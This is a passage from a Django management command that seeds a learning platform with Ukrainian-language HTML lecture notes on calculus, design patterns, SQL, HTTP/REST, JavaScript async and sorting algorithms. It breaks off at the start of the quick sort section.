"""
Management command: seed_rich_content
Наповнює лекції та уроки за останні два тижні детальним HTML-контентом —
конспектами, як під час реального заняття, та розгорнутими домашніми завданнями.
"""

import random
from datetime import date, datetime
from datetime import time as dtime
from datetime import timedelta

from django.core.management.base import BaseCommand
from django.utils import timezone

from main.models import Lesson

# ─────────────────────────────────────────────────────────────────────────────
# Теми за предметами (призначаються якщо topic порожній)
# ─────────────────────────────────────────────────────────────────────────────

TOPICS = {
    "Вища математика": [
        "Визначений інтеграл та його застосування",
        "Невизначений інтеграл. Методи інтегрування",
        "Диференціальні рівняння першого порядку",
        "Числові ряди. Ознаки збіжності",
        "Функції кількох змінних. Часткові похідні",
        "Подвійний інтеграл та його застосування",
        "Степеневі ряди. Ряд Тейлора та Маклорена",
    ],
    "Об'єктно-орієнтоване програмування": [
        "Інкапсуляція, наслідування, поліморфізм",
        "Патерни проектування: Singleton, Factory, Observer",
        "Абстрактні класи та інтерфейси",
        "Виняткові ситуації та їх обробка",
        "Узагальнені типи (Generics)",
        "Патерни проектування: Strategy, Command, Decorator",
        "SOLID-принципи проектування",
    ],
    "Бази даних": [
        "Реляційна модель даних. Нормальні форми",
        "SQL: складні запити, підзапити, JOIN",
        "Транзакції та рівні ізоляції",
        "Індекси та оптимізація запитів",
        "Збережені процедури та тригери",
        "NoSQL-бази даних: MongoDB, Redis",
        "Проектування баз даних. ER-діаграми",
    ],
    "Веб-технології": [
        "HTTP/HTTPS протокол. REST API",
        "JavaScript: асинхронність, Promise, async/await",
        "React: компоненти, хуки, стан",
        "CSS Flexbox та Grid Layout",
        "Автентифікація та авторизація у веб-додатках",
        "WebSockets та реал-тайм комунікація",
        "Django: моделі, представлення, шаблони",
    ],
    "Алгоритми та структури даних": [
        "Сортування: merge sort, quick sort, heap sort",
        "Бінарні дерева пошуку. AVL-дерева",
        "Графи: алгоритми BFS та DFS",
        "Алгоритм Дейкстри та A*",
        "Динамічне програмування",
        "Хеш-таблиці. Методи вирішення колізій",
        "Черги з пріоритетом. Купа (Heap)",
    ],
    "Комп'ютерні мережі": [
        "Модель OSI та стек протоколів TCP/IP",
        "Мережевий рівень. IP-адресація та маршрутизація",
        "Транспортний рівень. TCP vs UDP",
        "DNS, DHCP, NAT",
        "Мережева безпека. Брандмауери та VPN",
        "Бездротові мережі: Wi-Fi стандарти",
        "HTTP/2, HTTP/3 та оптимізація веб-трафіку",
    ],
    "Операційні системи": [
        "Управління процесами та потоками",
        "Синхронізація: м'ютекси, семафори, монітори",
        "Управління пам'яттю. Сторінкова організація",
        "Файлові системи: FAT, NTFS, ext4",
        "Планування процесів: FCFS, SJF, Round Robin",
        "Системні виклики Unix/Linux",
        "Deadlock: умови виникнення та методи запобігання",
    ],
    "Програмування мовою Python": [
        "Декоратори та генератори",
        "Об'єктно-орієнтоване програмування в Python",
        "Робота з файлами, JSON, CSV",
        "Мережеве програмування: requests, aiohttp",
        "NumPy та Pandas: основи аналізу даних",
        "Тестування: unittest, pytest",
        "Паралельне програмування: threading, multiprocessing, asyncio",
    ],
    "Дискретна математика": [
        "Теорія множин. Відношення та функції",
        "Математична логіка. Нормальні форми",
        "Теорія графів. Основні поняття та задачі",
        "Комбінаторика: перестановки, розміщення, комбінації",
        "Булева алгебра та логічні схеми",
        "Рекурентні співвідношення",
        "Теорія автоматів і формальних мов",
    ],
    "Безпека інформаційних систем": [
        "Криптографія: симетричне та асиметричне шифрування",
        "Атаки на веб-додатки: XSS, SQL Injection, CSRF",
        "PKI та цифровий підпис",
        "Мережеві атаки та методи захисту",
        "Аутентифікація: паролі, MFA, OAuth 2.0",
        "Пентестинг: методологія та інструменти",
        "OWASP Top 10: огляд вразливостей",
    ],
}

DEFAULT_TOPICS = [
    "Введення в тему. Основні поняття",
    "Теоретичні основи розділу",
    "Практичне застосування теорії",
    "Розбір типових задач та прикладів",
    "Узагальнення та систематизація знань",
]

# ─────────────────────────────────────────────────────────────────────────────
# Великий HTML-контент лекцій за предметами
# ─────────────────────────────────────────────────────────────────────────────

LECTURE_HTML = {
    # ── Вища математика ─────────────────────────────────────────────────────
    "Вища математика": [
        # Тема: Визначений інтеграл
        """<h2>Визначений інтеграл та його застосування</h2>
<h3>1. Визначення визначеного інтеграла</h3>
<p>Нехай функція <strong>f(x)</strong> визначена та обмежена на відрізку <strong>[a, b]</strong>. Розіб'ємо цей відрізок на <em>n</em> частин точками:</p>
<p><strong>a = x₀ &lt; x₁ &lt; x₂ &lt; … &lt; xₙ = b</strong></p>
<p>На кожному підвідрізку <strong>[xᵢ₋₁, xᵢ]</strong> оберемо довільну точку ξᵢ та складемо <em>інтегральну суму Рімана</em>:</p>
<blockquote><strong>Sₙ = Σ f(ξᵢ) · Δxᵢ,  де Δxᵢ = xᵢ − xᵢ₋₁</strong></blockquote>
<p>Якщо при max(Δxᵢ) → 0 ця сума прямує до скінченної границі, що не залежить від способу розбиття та вибору ξᵢ, то ця границя називається <strong>визначеним інтегралом</strong> функції f(x) від a до b:</p>
<blockquote><strong>∫ₐᵇ f(x) dx = lim Sₙ</strong></blockquote>

<h3>2. Основна теорема математичного аналізу (теорема Ньютона–Лейбніца)</h3>
<p>Якщо функція <strong>F(x)</strong> є первісною функції <strong>f(x)</strong> на <strong>[a, b]</strong>, тобто <strong>F'(x) = f(x)</strong>, то:</p>
<blockquote><strong>∫ₐᵇ f(x) dx = F(b) − F(a) = F(x) |ₐᵇ</strong></blockquote>
<p>Ця теорема є фундаментальним зв'язком між диференціальним та інтегральним численням.</p>

<h3>3. Основні властивості визначеного інтеграла</h3>
<ul>
<li><strong>Лінійність:</strong> ∫ₐᵇ [αf(x) + βg(x)] dx = α∫ₐᵇf(x)dx + β∫ₐᵇg(x)dx</li>
<li><strong>Адитивність:</strong> ∫ₐᵇf(x)dx = ∫ₐᶜf(x)dx + ∫ᶜᵇf(x)dx</li>
<li><strong>Зміна знаку при перестановці меж:</strong> ∫ₐᵇf(x)dx = −∫ᵦₐf(x)dx</li>
<li><strong>Оцінка інтеграла:</strong> m(b−a) ≤ ∫ₐᵇf(x)dx ≤ M(b−a)</li>
</ul>

<h3>4. Застосування визначеного інтеграла</h3>
<p><strong>4.1 Площа фігури</strong></p>
<p>Площа криволінійної трапеції, обмеженої кривою y = f(x) ≥ 0, осями та прямими x = a, x = b:</p>
<blockquote><strong>S = ∫ₐᵇ f(x) dx</strong></blockquote>
<p>Площа між двома кривими y₁ = f(x) та y₂ = g(x), де f(x) ≥ g(x) на [a, b]:</p>
<blockquote><strong>S = ∫ₐᵇ [f(x) − g(x)] dx</strong></blockquote>

<p><strong>4.2 Об'єм тіла обертання</strong></p>
<p>При обертанні навколо осі Ox:</p>
<blockquote><strong>V = π · ∫ₐᵇ [f(x)]² dx</strong></blockquote>

<p><strong>4.3 Довжина дуги кривої</strong></p>
<blockquote><strong>L = ∫ₐᵇ √(1 + [f'(x)]²) dx</strong></blockquote>

<h3>5. Розбір прикладів</h3>
<p><strong>Приклад 1.</strong> Обчислити ∫₀² (3x² − 2x + 1) dx</p>
<p>Знаходимо первісну: F(x) = x³ − x² + x</p>
<p>F(2) − F(0) = (8 − 4 + 2) − 0 = <strong>6</strong></p>
<p><strong>Приклад 2.</strong> Знайти площу, обмежену параболою y = x² та прямою y = 2x.</p>
<p>Точки перетину: x² = 2x → x = 0, x = 2</p>
<p>S = ∫₀² (2x − x²) dx = [x² − x³/3]₀² = 4 − 8/3 = <strong>4/3</strong></p>

<h3>6. Невласні інтеграли</h3>
<p>Якщо межа інтегрування або підінтегральна функція необмежена, говорять про <strong>невласний інтеграл</strong>:</p>
<blockquote><strong>∫ₐ⁺∞ f(x) dx = lim_{b→∞} ∫ₐᵇ f(x) dx</strong></blockquote>
<p>Інтеграл <strong>збігається</strong>, якщо ця границя існує та скінченна; <strong>розбігається</strong> в іншому випадку.</p>
<p><strong>Класичний приклад:</strong> ∫₁⁺∞ dx/xᵖ збігається при p &gt; 1 та розбігається при p ≤ 1.</p>""",
        # Тема: Диференціальні рівняння
        """<h2>Диференціальні рівняння першого порядку</h2>
<h3>1. Основні поняття та класифікація</h3>
<p>Рівняння, що містить невідому функцію та її похідні, називається <strong>диференціальним рівнянням (ДР)</strong>. Порядок найвищої похідної — це <em>порядок</em> рівняння.</p>
<p>Загальний вигляд ДР першого порядку:</p>
<blockquote><strong>F(x, y, y') = 0  або  y' = f(x, y)</strong></blockquote>
<p><strong>Загальний розв'язок</strong> містить одну довільну сталу C.<br>
<strong>Частинний розв'язок</strong> — конкретне значення C, що задовольняє початковій умові y(x₀) = y₀.</p>

<h3>2. Диференціальні рівняння зі змінними, що розділяються</h3>
<p>Рівняння виду: <strong>g(y) dy = f(x) dx</strong></p>
<p><strong>Метод розв'язання:</strong></p>
<ol>
<li>Розділити змінні: перенести все з y на ліву сторону, все з x — на праву</li>
<li>Проінтегрувати обидві частини</li>
<li>Виразити y (якщо можливо)</li>
</ol>
<p><strong>Приклад:</strong> Розв'язати y' = xy</p>
<p>dy/y = x dx → ln|y| = x²/2 + C₁ → <strong>y = Ce^(x²/2)</strong></p>

<h3>3. Однорідні диференціальні рівняння</h3>
<p>Рівняння y' = f(y/x) називається <strong>однорідним</strong>. Замінюємо y = vx, де v = v(x):</p>
<blockquote><strong>y = vx → y' = v + xv'</strong></blockquote>
<p>Після підстановки отримуємо рівняння зі змінними, що розділяються відносно v та x.</p>

<h3>4. Лінійні диференціальні рівняння першого порядку</h3>
<p>Вигляд: <strong>y' + P(x)·y = Q(x)</strong></p>
<p><strong>Метод варіації сталої (Лагранж):</strong></p>
<ol>
<li>Розв'язуємо однорідне рівняння: y' + P(x)y = 0 → y₀ = Ce^(−∫P(x)dx)</li>
<li>Вважаємо C = C(x) і знаходимо C'(x) з неоднорідного рівняння</li>
<li>Загальний розв'язок: y = e^(−∫P dx) · (∫Q·e^(∫P dx) dx + C)</li>
</ol>
<p><strong>Приклад:</strong> y' − y/x = x²</p>
<p>P(x) = −1/x, Q(x) = x²<br>
Загальний розв'язок: <strong>y = x³/2 + Cx</strong></p>

<h3>5. Рівняння Бернуллі</h3>
<p>Вигляд: <strong>y' + P(x)y = Q(x)·yⁿ</strong>,  n ≠ 0, 1</p>
<p>Замінюємо z = y^(1−n), тоді рівняння стає лінійним відносно z.</p>

<h3>6. Задача Коші та теорема існування і єдиності</h3>
<p>Задача Коші: знайти розв'язок y' = f(x, y) при початковій умові y(x₀) = y₀.</p>
<p><strong>Теорема Піккара:</strong> Якщо f(x,y) та ∂f/∂y неперервні в деякому прямокутнику навколо (x₀, y₀), то існує єдиний розв'язок задачі Коші в деякому околі точки x₀.</p>""",
    ],
    # ── ООП ─────────────────────────────────────────────────────────────────
    "Об'єктно-орієнтоване програмування": [
        """<h2>Патерни проектування: Singleton, Factory, Observer</h2>
<h3>1. Що таке патерни проектування?</h3>
<p>Патерни проектування — це типові рішення для типових проблем, що виникають при проектуванні програмного забезпечення. Вони класифікуються на три категорії:</p>
<ul>
<li><strong>Породжуючі (Creational)</strong> — відповідають за гнучке створення об'єктів</li>
<li><strong>Структурні (Structural)</strong> — показують, як скласти об'єкти у більші структури</li>
<li><strong>Поведінкові (Behavioral)</strong> — відповідають за ефективну комунікацію між об'єктами</li>
</ul>

<h3>2. Singleton (Одинак)</h3>
<p>Гарантує, що клас має лише один екземпляр, і надає глобальну точку доступу до нього.</p>
<p><strong>Застосування:</strong> кеш, пул з'єднань до БД, логгер, конфігурація.</p>
<pre class="ql-syntax" spellcheck="false">public class Singleton {
    private static Singleton instance;

    private Singleton() {}  // приватний конструктор

    public static synchronized Singleton getInstance() {
        if (instance == null) {
            instance = new Singleton();
        }
        return instance;
    }
}</pre>
<p><strong>Потокобезпечна версія (Double-checked locking):</strong></p>
<pre class="ql-syntax" spellcheck="false">private static volatile Singleton instance;

public static Singleton getInstance() {
    if (instance == null) {
        synchronized (Singleton.class) {
            if (instance == null) {
                instance = new Singleton();
            }
        }
    }
    return instance;
}</pre>
<blockquote>⚠️ Singleton ускладнює тестування (замінити залежність складно). У сучасному коді часто замінюють Dependency Injection.</blockquote>

<h3>3. Factory Method (Фабричний метод)</h3>
<p>Визначає інтерфейс для створення об'єкта, але дозволяє підкласам вирішити, який клас інстанціювати.</p>
<pre class="ql-syntax" spellcheck="false">// Продукт
interface Shape {
    void draw();
}

// Конкретні продукти
class Circle implements Shape {
    public void draw() { System.out.println("Малюємо коло"); }
}
class Square implements Shape {
    public void draw() { System.out.println("Малюємо квадрат"); }
}

// Фабрика
class ShapeFactory {
    public static Shape create(String type) {
        return switch (type) {
            case "circle" -> new Circle();
            case "square" -> new Square();
            default -> throw new IllegalArgumentException("Невідомий тип: " + type);
        };
    }
}</pre>
<p><strong>Переваги:</strong> відокремлення коду створення від коду використання, легко додавати нові типи.</p>

<h3>4. Observer (Спостерігач)</h3>
<p>Визначає залежність «один до багатьох»: при зміні стану об'єкта всі залежні об'єкти автоматично сповіщаються.</p>
<p><strong>Застосування:</strong> GUI-події, реактивне програмування, шина подій.</p>
<pre class="ql-syntax" spellcheck="false">// Інтерфейс спостерігача
interface Observer {
    void update(String event);
}

// Суб'єкт (видавець)
class EventSource {
    private List&lt;Observer&gt; observers = new ArrayList&lt;&gt;();

    public void subscribe(Observer o) { observers.add(o); }
    public void unsubscribe(Observer o) { observers.remove(o); }

    public void notify(String event) {
        for (Observer o : observers) {
            o.update(event);
        }
    }
}

// Конкретний спостерігач
class Logger implements Observer {
    public void update(String event) {
        System.out.println("[LOG] Подія: " + event);
    }
}</pre>

<h3>5. Порівняльна таблиця патернів</h3>
<ul>
<li><strong>Singleton</strong> — 1 екземпляр на всю програму, глобальний доступ</li>
<li><strong>Factory</strong> — делегування логіки створення об'єктів</li>
<li><strong>Observer</strong> — повідомлення підписників про зміни</li>
</ul>
<p>На наступній лекції розглянемо <strong>Decorator, Strategy та Command</strong>.</p>""",
        """<h2>SOLID-принципи проектування</h2>
<h3>Що таке SOLID?</h3>
<p>SOLID — абревіатура для п'яти принципів об'єктно-орієнтованого проектування, сформульованих Робертом Мартіном. Дотримання цих принципів робить код гнучким, розширюваним та легким для підтримки.</p>

<h3>S — Single Responsibility Principle (Принцип єдиної відповідальності)</h3>
<p>Клас повинен мати <strong>лише одну причину для зміни</strong>.</p>
<pre class="ql-syntax" spellcheck="false">// ❌ Погано: клас відповідає і за логіку, і за збереження
class Report {
    public String generate() { ... }
    public void saveToFile(String path) { ... }
    public void sendByEmail(String to) { ... }
}

// ✅ Добре: розділяємо відповідальності
class Report { public String generate() { ... } }
class ReportSaver { public void save(Report r, String path) { ... } }
class ReportMailer { public void send(Report r, String to) { ... } }</pre>

<h3>O — Open/Closed Principle (Принцип відкритості/закритості)</h3>
<p>Класи повинні бути <strong>відкриті для розширення, але закриті для модифікації</strong>.</p>
<pre class="ql-syntax" spellcheck="false">// Замість if/else — поліморфізм
interface Discount {
    double apply(double price);
}
class SeasonalDiscount implements Discount {
    public double apply(double price) { return price * 0.9; }
}
class StudentDiscount implements Discount {
    public double apply(double price) { return price * 0.8; }
}</pre>

<h3>L — Liskov Substitution Principle (Принцип підстановки Ліскова)</h3>
<p>Об'єкти дочірнього класу повинні <strong>замінювати об'єкти батьківського</strong> без порушення роботи програми.</p>
<blockquote>Якщо ви передаєте підклас туди, де очікується базовий клас, поведінка не повинна змінюватись несподівано.</blockquote>

<h3>I — Interface Segregation Principle (Принцип розділення інтерфейсів)</h3>
<p>Краще мати <strong>багато специфічних інтерфейсів</strong>, ніж один загальний. Клас не повинен реалізовувати методи, які він не використовує.</p>

<h3>D — Dependency Inversion Principle (Принцип інверсії залежностей)</h3>
<p>Модулі верхнього рівня не повинні залежати від модулів нижнього рівня — <strong>обидва повинні залежати від абстракцій</strong>.</p>
<pre class="ql-syntax" spellcheck="false">// ❌ Погано: пряма залежність від конкретного класу
class OrderService {
    private MySQLDatabase db = new MySQLDatabase();
}

// ✅ Добре: залежність від інтерфейсу
class OrderService {
    private Database db;
    public OrderService(Database db) { this.db = db; }
}</pre>
<p>Це дозволяє легко підміняти реалізацію (MySQL → PostgreSQL, або mock у тестах).</p>

<h3>Підсумок</h3>
<ul>
<li><strong>S</strong> — одна відповідальність на клас</li>
<li><strong>O</strong> — розширюй, не змінюй</li>
<li><strong>L</strong> — підкласи сумісні з батьківськими</li>
<li><strong>I</strong> — дрібні інтерфейси кращі за великі</li>
<li><strong>D</strong> — залежи від абстракцій, а не від конкретики</li>
</ul>""",
    ],
    # ── Бази даних ──────────────────────────────────────────────────────────
    "Бази даних": [
        """<h2>SQL: складні запити, підзапити, JOIN</h2>
<h3>1. Типи JOIN</h3>
<p>Оператор <strong>JOIN</strong> дозволяє об'єднувати рядки з двох або більше таблиць на основі пов'язаного стовпця.</p>
<ul>
<li><strong>INNER JOIN</strong> — повертає лише рядки, що мають відповідність в обох таблицях</li>
<li><strong>LEFT JOIN</strong> — всі рядки з лівої таблиці + відповідні з правої (NULL, якщо немає)</li>
<li><strong>RIGHT JOIN</strong> — всі рядки з правої таблиці + відповідні з лівої</li>
<li><strong>FULL OUTER JOIN</strong> — всі рядки з обох таблиць</li>
<li><strong>CROSS JOIN</strong> — декартовий добуток (кожен з кожним)</li>
</ul>
<pre class="ql-syntax" spellcheck="false">-- Список студентів з назвами їхніх груп
SELECT s.full_name, g.name AS group_name
FROM students s
INNER JOIN groups g ON s.group_id = g.id;

-- Всі студенти, навіть без оцінок
SELECT s.full_name, g.points
FROM students s
LEFT JOIN grades g ON s.id = g.student_id;

-- Самоз'єднання: знайти співробітників та їх менеджерів
SELECT e.name AS employee, m.name AS manager
FROM employees e
LEFT JOIN employees m ON e.manager_id = m.id;</pre>

<h3>2. Підзапити</h3>
<p>Підзапит — це SELECT всередині іншого запиту. Може стояти у WHERE, FROM, SELECT.</p>
<pre class="ql-syntax" spellcheck="false">-- Студенти з оцінкою вище середньої
SELECT full_name, grade
FROM students
WHERE grade > (SELECT AVG(grade) FROM students);

-- Студенти, які здали хоча б одну роботу
SELECT full_name FROM students
WHERE id IN (
    SELECT DISTINCT student_id FROM submissions
    WHERE status = 'turned_in'
);

-- NOT EXISTS: студенти без жодної оцінки
SELECT s.full_name
FROM students s
WHERE NOT EXISTS (
    SELECT 1 FROM grades g WHERE g.student_id = s.id
);</pre>

<h3>3. Агрегатні функції та GROUP BY</h3>
<pre class="ql-syntax" spellcheck="false">-- Кількість студентів та середній бал по групах
SELECT g.name, COUNT(s.id) AS students, AVG(p.earned_points) AS avg_grade
FROM groups g
JOIN students s ON s.group_id = g.id
LEFT JOIN student_performance p ON p.student_id = s.id
GROUP BY g.name
HAVING AVG(p.earned_points) > 7
ORDER BY avg_grade DESC;</pre>
<p><strong>HAVING</strong> фільтрує результати після групування (на відміну від WHERE — до).</p>

<h3>4. Вікнові функції (Window Functions)</h3>
<p>Дозволяють виконувати обчислення по групах рядків без їх згортання.</p>
<pre class="ql-syntax" spellcheck="false">-- Рейтинг студентів у кожній групі за середнім балом
SELECT
    full_name,
    group_name,
    avg_grade,
    RANK() OVER (PARTITION BY group_name ORDER BY avg_grade DESC) AS rank_in_group
FROM student_stats;

-- Накопичувальна сума
SELECT date, amount,
    SUM(amount) OVER (ORDER BY date) AS running_total
FROM payments;</pre>

<h3>5. CTE (Common Table Expressions)</h3>
<pre class="ql-syntax" spellcheck="false">WITH top_students AS (
    SELECT student_id, AVG(earned_points) AS avg_pts
    FROM student_performance
    GROUP BY student_id
    HAVING AVG(earned_points) >= 10
)
SELECT s.full_name, t.avg_pts
FROM students s
JOIN top_students t ON s.id = t.student_id
ORDER BY t.avg_pts DESC;</pre>
<p>CTE роблять складні запити читабельнішими та дозволяють рекурсію (рекурсивний CTE).</p>""",
        """<h2>Транзакції та рівні ізоляції</h2>
<h3>1. Що таке транзакція?</h3>
<p>Транзакція — це послідовність операцій над базою даних, яка виконується як <strong>єдине ціле</strong>. Якщо одна операція зазнає невдачі, всі зміни відкочуються.</p>

<h3>2. ACID-властивості</h3>
<ul>
<li><strong>Atomicity (Атомарність)</strong> — транзакція виконується повністю або не виконується взагалі</li>
<li><strong>Consistency (Узгодженість)</strong> — транзакція переводить БД з одного коректного стану в інший</li>
<li><strong>Isolation (Ізольованість)</strong> — паралельні транзакції не впливають одна на одну</li>
<li><strong>Durability (Тривалість)</strong> — після COMMIT зміни зберігаються навіть після збою</li>
</ul>
<pre class="ql-syntax" spellcheck="false">BEGIN TRANSACTION;
  UPDATE accounts SET balance = balance - 500 WHERE id = 1;
  UPDATE accounts SET balance = balance + 500 WHERE id = 2;
  -- Якщо обидва запити OK:
COMMIT;
  -- Інакше:
ROLLBACK;</pre>

<h3>3. Проблеми паралельного доступу</h3>
<ul>
<li><strong>Брудне читання (Dirty Read)</strong> — читання незафіксованих змін іншої транзакції</li>
<li><strong>Неповторюване читання (Non-repeatable Read)</strong> — два однакових SELECT дають різні результати</li>
<li><strong>Фантомне читання (Phantom Read)</strong> — новий рядок з'являється між двома SELECT у транзакції</li>
</ul>

<h3>4. Рівні ізоляції (SQL стандарт)</h3>
<table>
<thead><tr><th>Рівень</th><th>Dirty Read</th><th>Non-rep. Read</th><th>Phantom Read</th></tr></thead>
<tbody>
<tr><td><strong>READ UNCOMMITTED</strong></td><td>✓</td><td>✓</td><td>✓</td></tr>
<tr><td><strong>READ COMMITTED</strong></td><td>✗</td><td>✓</td><td>✓</td></tr>
<tr><td><strong>REPEATABLE READ</strong></td><td>✗</td><td>✗</td><td>✓</td></tr>
<tr><td><strong>SERIALIZABLE</strong></td><td>✗</td><td>✗</td><td>✗</td></tr>
</tbody>
</table>
<blockquote>PostgreSQL за замовчуванням: READ COMMITTED. MySQL InnoDB: REPEATABLE READ.</blockquote>
<pre class="ql-syntax" spellcheck="false">-- PostgreSQL: встановити рівень ізоляції
BEGIN;
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;
-- ... ваші запити ...
COMMIT;</pre>

<h3>5. Deadlock</h3>
<p>Взаємне блокування виникає, коли дві транзакції чекають на блокування, що тримає інша.</p>
<pre class="ql-syntax" spellcheck="false">-- Транзакція A:  lock(row 1) → wait(row 2)
-- Транзакція B:  lock(row 2) → wait(row 1)  ← DEADLOCK!</pre>
<p><strong>Способи запобігання:</strong> завжди блокувати ресурси в одному порядку, встановлювати таймаути, використовувати SELECT FOR UPDATE SKIP LOCKED.</p>""",
    ],
    # ── Веб-технології ──────────────────────────────────────────────────────
    "Веб-технології": [
        """<h2>HTTP/HTTPS протокол. REST API</h2>
<h3>1. HTTP — основи</h3>
<p><strong>HTTP (HyperText Transfer Protocol)</strong> — протокол прикладного рівня для передачі даних у Вебі. Базується на моделі <em>запит-відповідь</em>.</p>
<p><strong>Структура HTTP-запиту:</strong></p>
<pre class="ql-syntax" spellcheck="false">GET /api/students?group=КН-21 HTTP/1.1
Host: mybosco.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Accept: application/json
User-Agent: Mozilla/5.0</pre>
<p><strong>Структура HTTP-відповіді:</strong></p>
<pre class="ql-syntax" spellcheck="false">HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache

{"students": [{"id": 1, "name": "Іваненко Олена"}]}</pre>

<h3>2. HTTP-методи</h3>
<ul>
<li><strong>GET</strong> — отримання ресурсу (ідемпотентний, безпечний)</li>
<li><strong>POST</strong> — створення нового ресурсу</li>
<li><strong>PUT</strong> — повна заміна ресурсу (ідемпотентний)</li>
<li><strong>PATCH</strong> — часткове оновлення ресурсу</li>
<li><strong>DELETE</strong> — видалення ресурсу (ідемпотентний)</li>
<li><strong>OPTIONS</strong> — CORS preflight, отримання дозволених методів</li>
</ul>

<h3>3. HTTP-коди стану</h3>
<ul>
<li><strong>2xx — Успіх:</strong> 200 OK, 201 Created, 204 No Content</li>
<li><strong>3xx — Перенаправлення:</strong> 301 Moved Permanently, 304 Not Modified</li>
<li><strong>4xx — Помилка клієнта:</strong> 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 422 Unprocessable Entity</li>
<li><strong>5xx — Помилка сервера:</strong> 500 Internal Server Error, 503 Service Unavailable</li>
</ul>

<h3>4. REST API — принципи</h3>
<p><strong>REST (Representational State Transfer)</strong> — архітектурний стиль для API. Ключові обмеження:</p>
<ol>
<li><strong>Client-Server</strong> — розподіл відповідальності між клієнтом і сервером</li>
<li><strong>Stateless</strong> — кожен запит містить всю необхідну інформацію</li>
<li><strong>Cacheable</strong> — відповіді можуть кешуватися</li>
<li><strong>Uniform Interface</strong> — єдиний інтерфейс взаємодії</li>
<li><strong>Layered System</strong> — клієнт не знає, з яким саме сервером спілкується</li>
</ol>

<h3>5. Проектування REST API — приклад</h3>
<pre class="ql-syntax" spellcheck="false"># Ресурс: студенти
GET    /api/students/          → список студентів
POST   /api/students/          → створити студента
GET    /api/students/{id}/     → отримати студента
PUT    /api/students/{id}/     → оновити студента
DELETE /api/students/{id}/     → видалити студента

# Вкладені ресурси
GET    /api/groups/{id}/students/    → студенти групи
POST   /api/lessons/{id}/grade/      → виставити оцінку за заняття</pre>

<h3>6. HTTPS та TLS</h3>
<p><strong>HTTPS = HTTP + TLS</strong>. TLS (Transport Layer Security) забезпечує:</p>
<ul>
<li><strong>Шифрування</strong> — дані неможливо прочитати при перехопленні</li>
<li><strong>Автентифікацію</strong> — підтвердження справжності сервера через сертифікат</li>
<li><strong>Цілісність</strong> — дані не змінено в процесі передачі</li>
</ul>
<p>TLS-handshake: обмін сертифікатами → узгодження шифру → обмін ключами → шифрований канал.</p>""",
        """<h2>JavaScript: асинхронність, Promise, async/await</h2>
<h3>1. Однопотокова природа JS та Event Loop</h3>
<p>JavaScript — <strong>однопотокова</strong> мова. Але браузер (та Node.js) надають Web APIs для асинхронних операцій (таймери, мережа, файли).</p>
<p><strong>Event Loop</strong> постійно перевіряє:</p>
<ol>
<li>Чи порожній Call Stack?</li>
<li>Якщо так — бере завдання з <em>Macrotask Queue</em> (setTimeout, setInterval, I/O)</li>
<li>Але спочатку спустошує <em>Microtask Queue</em> (Promise.then, queueMicrotask)</li>
</ol>
<pre class="ql-syntax" spellcheck="false">console.log('1');
setTimeout(() => console.log('2'), 0);
Promise.resolve().then(() => console.log('3'));
console.log('4');
// Вивід: 1, 4, 3, 2</pre>

<h3>2. Callbacks — "callback hell"</h3>
<pre class="ql-syntax" spellcheck="false">getUser(userId, (user) => {
    getOrders(user.id, (orders) => {
        getProduct(orders[0].productId, (product) => {
            // 😱 Піраміда загибелі
        });
    });
});</pre>

<h3>3. Promise</h3>
<p>Promise — об'єкт, що представляє результат асинхронної операції. Стани: <strong>pending → fulfilled / rejected</strong>.</p>
<pre class="ql-syntax" spellcheck="false">// Створення
const promise = new Promise((resolve, reject) => {
    setTimeout(() => resolve('Дані отримано!'), 1000);
});

// Використання
promise
    .then(data => console.log(data))
    .catch(err => console.error(err))
    .finally(() => console.log('Завжди виконується'));

// Promise.all — паралельне виконання
const [user, orders] = await Promise.all([
    fetchUser(id),
    fetchOrders(id)
]);</pre>

<h3>4. async/await</h3>
<p>Синтаксичний цукор над Promise. Робить асинхронний код схожим на синхронний.</p>
<pre class="ql-syntax" spellcheck="false">async function loadStudentData(studentId) {
    try {
        const response = await fetch(`/api/students/${studentId}/`);

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Помилка завантаження:', error);
        throw error;
    }
}

// Виклик
const student = await loadStudentData(42);
console.log(student.name);</pre>

<h3>5. Fetch API — робота з REST</h3>
<pre class="ql-syntax" spellcheck="false">// POST-запит із JSON-тілом
async function gradeStudent(lessonId, studentId, points) {
    const response = await fetch(`/api/lesson/${lessonId}/grade/`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': getCookie('csrftoken'),
        },
        body: JSON.stringify({ student_id: studentId, points }),
    });

    if (!response.ok) {
        const err = await response.json();
        throw new Error(err.detail || 'Помилка збереження');
    }

    return response.json();
}</pre>

<h3>6. Обробка помилок та AbortController</h3>
<pre class="ql-syntax" spellcheck="false">const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);

try {
    const res = await fetch('/api/data/', { signal: controller.signal });
    const data = await res.json();
} catch (e) {
    if (e.name === 'AbortError') {
        console.log('Запит скасовано (таймаут)');
    }
} finally {
    clearTimeout(timeoutId);
}</pre>""",
    ],
    # ── Алгоритми ───────────────────────────────────────────────────────────
    "Алгоритми та структури даних": [
        """<h2>Сортування: merge sort, quick sort, heap sort</h2>
<h3>1. Складність алгоритмів — нагадування</h3>
<p>Нотація <strong>O(n)</strong> описує, як зростає час виконання залежно від розміру вхідних даних у найгіршому випадку.</p>
<ul>
<li>O(n²) — сортування бульбашкою, вставками, вибором</li>
<li>O(n log n) — merge sort, quick sort (середній), heap sort</li>
<li>O(n) — сортування підрахунком, радіксне (при спеціальних умовах)</li>
</ul>

<h3>2. Merge Sort (Сортування злиттям)</h3>
<p>Стратегія <strong>divide and conquer</strong>: ділимо масив навпіл, рекурсивно сортуємо кожну половину, зливаємо.</p>
<pre class="ql-syntax" spellcheck="false">def merge_sort(arr):
    if len(arr) <= 1:
        return arr

    mid = len(arr) // 2
    left = merge_sort(arr[:mid])
    right = merge_sort(arr[mid:])

    return merge(left, right)

def merge(left, right):
    result = []
    i = j = 0
    while i < len(left) and j < len(right):
        if left[i] <= right[j]:
            result.append(left[i]); i += 1
        else:
            result.append(right[j]); j += 1
    return result + left[i:] + right[j:]</pre>
<p><strong>Складність:</strong> O(n log n) у всіх випадках.<br>
<strong>Пам'ять:</strong> O(n) — потребує додатковий масив.<br>
<strong>Стабільний:</strong> так (рівні елементи зберігають порядок).</p>

<h3>3. Quick Sort (Швидке сортування)</h3>
